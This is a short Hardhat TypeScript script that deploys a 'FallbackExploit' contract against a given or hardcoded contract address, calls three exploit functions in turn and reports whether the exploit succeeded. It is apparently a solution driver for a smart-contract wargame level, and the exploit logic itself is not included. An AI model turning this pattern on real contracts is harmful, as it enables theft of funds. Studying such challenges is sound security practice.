import { ethers, run } from "hardhat";

async function main() {
  const [exploiter] = await ethers.getSigners();
  const fallbackContract =
    process.argv[2]?.toLowerCase() ??
    "0xF062a28c24BB9982aC254b5cF6CFdD7fB6b18b7d";

  const _fallbackExploit = await ethers.getContractFactory("FallbackExploit");
  const FallbackExploit = await _fallbackExploit
    .connect(exploiter)
    .deploy(fallbackContract, { value: 2 });
  await FallbackExploit.deployed();

  const tx1 = await FallbackExploit.connect(exploiter).exploit1();
  const receipt1 = await tx1.wait();

  const tx2 = await FallbackExploit.connect(exploiter).exploit2();
  const receipt2 = await tx2.wait();

  const tx3 = await FallbackExploit.connect(exploiter).exploit3();
  const receipt3 = await tx3.wait();

  const exploitStatus = await FallbackExploit.exploited();
  console.log(`Fallback exploit status: ${exploitStatus}`);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
